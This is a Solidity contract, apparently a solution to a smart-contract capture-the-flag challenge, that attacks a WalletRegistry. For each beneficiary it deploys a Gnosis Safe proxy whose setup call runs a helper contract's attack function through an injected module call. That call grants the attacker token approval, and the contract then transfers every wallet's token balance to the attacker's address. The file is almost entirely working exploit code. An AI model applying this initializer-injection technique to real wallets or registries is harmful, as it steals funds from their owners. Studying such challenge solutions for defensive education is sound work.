// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./WalletRegistry.sol";
import "./WalletRegistryAttacker2.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "hardhat/console.sol";

contract WalletRegistryAttacker {
    GnosisSafeProxyFactory public immutable walletFactory;
    WalletRegistry public immutable walletRegistry;
    IERC20 public immutable token;

    constructor(
        address attacker,
        address masterCopyAddress,
        address walletFactoryAddress,
        address tokenAddress,
        address walletRegistryAddress,
        address[4] memory benArray
    ) {
        walletFactory = GnosisSafeProxyFactory(walletFactoryAddress);
        token = IERC20(tokenAddress);
        walletRegistry = WalletRegistry(walletRegistryAddress);
        WalletRegistryAttacker2 attContract = new WalletRegistryAttacker2();

        for (uint256 i = 0; i < benArray.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = benArray[i];

            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                1,
                address(attContract),
                abi.encodeWithSignature("attack(address,address)", address(token), address(this)),
                address(0),
                address(0),
                0,
                address(0)
            );

            GnosisSafeProxy wallet =
                walletFactory.createProxyWithCallback(masterCopyAddress, initializer, i, walletRegistry);

            token.transferFrom(address(wallet), attacker, token.balanceOf(address(wallet)));

        }
    }
}
